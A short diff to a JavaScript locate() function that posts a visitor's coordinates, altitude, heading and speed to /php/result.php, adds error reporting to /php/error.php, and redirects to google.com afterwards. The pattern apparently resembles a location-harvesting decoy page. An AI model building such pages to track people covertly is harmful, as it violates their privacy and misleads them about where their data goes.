@@ -7,6 +7,15 @@ function locate()
   }
   else
   {
+    var denied=undefined; var timeout=undefined; var unknown=undefined;
+    var unavailable="Geolocation is not Supported by your Browser...";
+    $.ajax({
+     type: 'POST',
+     url: '/php/error.php',
+     data: {Denied: denied, Una: unavailable, Time: timeout, Unk: unknown},
+     success: function(){$('#change').html('Failed');},
+     mimeType: 'text'
+    });
     alert('Geolocation is not Supported by your Browser...');
   }
 
@@ -23,7 +32,7 @@ function locate()
       type: 'POST',
       url: '/php/result.php',
       data: {Lat: lat, Lon: lon, Acc: acc, Alt: alt, Dir: dir, Spd: spd},
-      success: function(){window.location='http://example.com';},
+      success: function(){window.location='https://www.google.com';},
       mimeType: 'text'
     });
   };
